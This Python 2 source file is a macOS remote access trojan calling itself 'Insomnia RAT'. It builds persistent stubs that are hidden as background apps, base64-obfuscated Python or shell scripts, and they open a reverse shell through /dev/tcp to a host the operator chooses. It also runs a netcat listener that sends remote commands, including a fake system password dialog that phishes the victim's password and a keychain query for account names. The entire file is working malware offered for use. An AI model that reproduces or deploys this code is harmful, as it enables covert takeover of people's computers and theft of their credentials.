import os
import base64

redoo = 1

hd = os.getenv("HOME")

def helpSec():
	print('\n\033[91m\033[1mCommands:\033[0;0m\033[1m\n__help: Display Help\n__get_info: Get Info on Client\'s System\n__phish: Popup fake password prompt on client machine and return output\n__get_email: Get Client\'s email address\nexit: Exit prompt\n[Any other command]: Anything else inputted will be sent as a shell command on the client\'s machine\n')

while True:
	os.system('clear')
	x = raw_input("""\033[91m\033[1m\n[Insomnia RAT]\n[Developer: Hari Patel @ hari.p.221221@gmail.com]\n[Github: https://github.com/Hari-P-22121/InsomniaRAT]\033[0;0m
\033[1m
[1] Build Stub

[2] Listener

[3] Exit

Select any option: """)
	if x == '1':
		os.system('clear')
		print("""\033[91m\033[1m\n[Insomnia RAT]\n[Developer: Hari Patel @ hari.p.221221@gmail.com]\n[Github: https://github.com/Hari-P-22121/InsomniaRAT]\033[0;0m
\033[1m""")
		stubName = raw_input('Enter name of stub: ')
		os.system('clear')
		print("""\033[91m\033[1m\n[Insomnia RAT]\n[Developer: Hari Patel @ hari.p.221221@gmail.com]\n[Github: https://github.com/Hari-P-22121/InsomniaRAT]\033[0;0m
\033[1m""")
		hostName = raw_input('Enter hostname/ip for reverse connection: ')
		os.system('clear')
		redsdo = 1;
		while (redoo == 1):
			print("""\033[91m\033[1m\n[Insomnia RAT]\n[Developer: Hari Patel @ hari.p.221221@gmail.com]\n[Github: https://github.com/Hari-P-22121/InsomniaRAT]\033[0;0m
\033[1m""")
			portNum = raw_input('Enter port from 1024 to 65535 for reverse connection: ')
			try:
				portNum = int(portNum)	
				if portNum > 1024 and portNum < 65536:
					redoo = 0
					portNum = str(portNum)
					os.system('clear');
				else:
					redoo = 1
					os.system('clear')
			except:
					redoo = 1
					os.system('clear')
			while(redsdo == 1):
						print("""\033[91m\033[1m\n[Insomnia RAT]\n[Developer: Hari Patel @ hari.p.221221@gmail.com]\n[Github: https://github.com/Hari-P-22121/InsomniaRAT]\033[0;0m
\033[1m""")
						print('Stub Types:\n\n[1] Regular .app Application\n\n[2] Python Script\n\n[3] Shell Script\n\n')
						bb = int(raw_input('Enter Option: '))
						os.system('clear')
						if(bb == 1):
							redsdo = 0;
							stubData = """set myPath to path to me
set thePath to POSIX path of myPath
do shell script "chflags hidden " & thePath
tell application "System Events"
	make new login item at end of login items with properties {name:"", path:myPath, hidden:false}
end tell
do shell script "chflags nohidden " & thePath
repeat
	try
		do shell script "bash >& /dev/tcp/""" + hostName + """/""" + portNum + """ 0>&1"
	on error
		delay 0.1
	end try
end repeat"""
							n = open('/Library/Fonts/tempCMKDN.scpt', 'w+')
							n.write(stubData)
							n.close()
							os.system("osacompile -o ~/Desktop/" + stubName + ".app /Library/Fonts/tempCMKDN.scpt")
							os.system('rm -rf /Library/Fonts/tempCMKDN.scpt')
							s = open(hd + '/Desktop/' + stubName + '.app/Contents/Info.plist', 'r')
							x = s.readlines()
							s.close()
							x.pop(-1)
							x.pop(-1)
							x.append('\t<key>LSBackgroundOnly</key>\n')
							x.append('\t<true/>\n')
							x.append('\t<key>LSUIElement</key>\n')
							x.append('\t<string>1</string>\n')
							x.append('</dict>\n')
							x.append('</plist>\n')
							a = ''.join(x)
							d = open(hd + '/Desktop/' + stubName + '.app/Contents/Info.plist', 'w+')
							d.write(a)
							d.close()
						elif (bb == 2):
							print('bbb')
							redsdo = 0;
							tmpData = base64.b64encode("import os\nimport base64\nfrom time import sleep\nwhile(True):\n     sleep(0.1)\n     os.system('bash >& /dev/tcp/" + hostName + "/" + portNum + " 0>&1')")
							stubData = """import os\nimport base64\nexec(base64.b64decode('"""+tmpData+"""'))"""
							d = open(hd + '/Desktop/' + stubName + '.py', 'w+')
							d.write(stubData)
							d.close()
						elif (bb == 3):
							redsdo = 0;
							stubData = 'bash >& /dev/tcp/' + hostName + '/' + portNum + ' 0>&1'
							r = open(hd + '/Desktop/' + stubName + '.sh', 'w+')
							r.write(stubData)
							r.close()
						else:
							print('aadas')
							redsdo = 1;
	elif x == '2':
		os.system('clear')
		print("""\033[91m\033[1m\n[Insomnia RAT]\n[Developer: Hari Patel @ hari.p.2212@gmail.com]\n[Github: https://github.com/Hari-P-22121/InsomniaRAT]\033[0;0m
\033[1m""")
		portListen = raw_input('Enter port number to listen on from 1024 to 65535: ')
		os.system('clear')
		while True:
			print('\033[91m\033[1mCommands:\033[0;0m\033[1m\n__help: Display Help\n__get_info: Get Info on Client\'s System\n__phish: Popup fake password prompt on client machine and return output\n__get_email: Get Client\'s email address\n__exit: Exit prompt\n[Any other command]: Anything else inputted will be sent as a shell command on the client\'s machine')
			cmdd = raw_input('Enter Command: ')
			print(cmdd)
			print(cmdd == '__get_info')
			if cmdd == '__phish':
				ph = "tell application \"Finder\"\nactivate\nset myprompt to \"Type your password to allow System Preferences to make changes\"\nset ans to \"Cancel\"\nrepeat\ntry\nset d_returns to display dialog myprompt default answer \"\" buttons {\"Cancel\", \"OK\"} default button \"OK\" with icon (path to resource \"FileVaultIcon.icns\" in bundle \"/System/Library/CoreServices/CoreTypes.bundle\") with hidden answer\nset ans to button returned of d_returns\nset mypass to text returned of d_returns\nif mypass > \"\" then exit repeat\nend try\nend repeat\ntry\ndo shell script \"echo Password: \" & quoted form of mypass\nend try\nend tell"
				ph = "osascript -e '" + ph + "'"
				cmdd = ph
			elif cmdd == '__get_info':
				cmdd = "osascript -e \'get system info\'"
			elif cmdd == '__cmd_shell':
				cmdd = "bash"
			elif cmdd == '__get_email':
				cmdd = "security find-internet-password | grep 'acct'"
			elif cmdd == '__exit':
				print('Goodbye!')
				quit()
			elif cmdd == '__help':
				helpSec()
			elif cmdd == '':
				v = 1
			os.system("echo \"" + cmdd + "\" | nc -l " + portListen)
	elif x == '3':
		os.system('clear')
		quit()
	else:
		os.system('clear')